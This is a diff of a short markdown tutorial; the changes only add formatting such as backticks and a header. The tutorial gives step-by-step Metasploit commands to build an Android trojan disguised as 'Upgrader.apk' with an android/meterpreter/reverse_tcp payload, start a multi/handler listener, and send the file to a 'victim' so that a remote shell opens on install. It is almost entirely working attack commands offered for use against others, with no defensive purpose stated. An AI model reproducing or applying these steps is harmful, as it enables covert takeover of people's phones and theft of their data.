@@ -1,21 +1,25 @@
-Open a terminal, and make a Trojan .apk
+#H2 Open a terminal, and make a Trojan .apk
 
-msfpayload -p android/meterpreter/reverse_tcp LHOST=192.168.0.4 R > /root/Upgrader.apk (replace LHOST with your own IP)
+`msfpayload -p android/meterpreter/reverse_tcp LHOST=192.168.0.4 R > /root/Upgrader.apk` (replace LHOST with your own IP)
 
 
 Open Another Terminal while the file is being produced.
-Load metasploit console, by typing : msfconsole
+Load metasploit console, by typing : 
+`msfconsole`
 
 
 Set-Up a Listener:
-load the multi-handler exploit by typing : use exploit/multi/handler
+load the multi-handler exploit by typing : 
+`use exploit/multi/handler`
 
 
-Set up a (reverse) payload by typing : set payload android/meterpreter/reverse_tcp
+Set up a (reverse) payload by typing : 
+`set payload android/meterpreter/reverse_tcp`
 To set L host type : set LHOST 192.168.0.4 (make sure you use your private IP not public)
 
 
 Type 'exploit' to start the listener.
+`exploit`
 
 
 Then send the Trojan you made to the victim
@@ -25,9 +29,9 @@ When the victim installs the Trojan, a Meterpreter shell will open in Metasploit
 
 
 
->> msfpayload -p android/meterpreter/reverse_tcp LHOST=192.168.0.4 R > /root/Upgrader.apk
+`>> msfpayload -p android/meterpreter/reverse_tcp LHOST=192.168.0.4 R > /root/Upgrader.apk
 >> msfconsole
 >> use exploit /multi/handler
 >> SET payload android/meterpreter/reverse_tcp
 >> SET LHOST 192.168.0.4
->> Exploit
+>> Exploit`
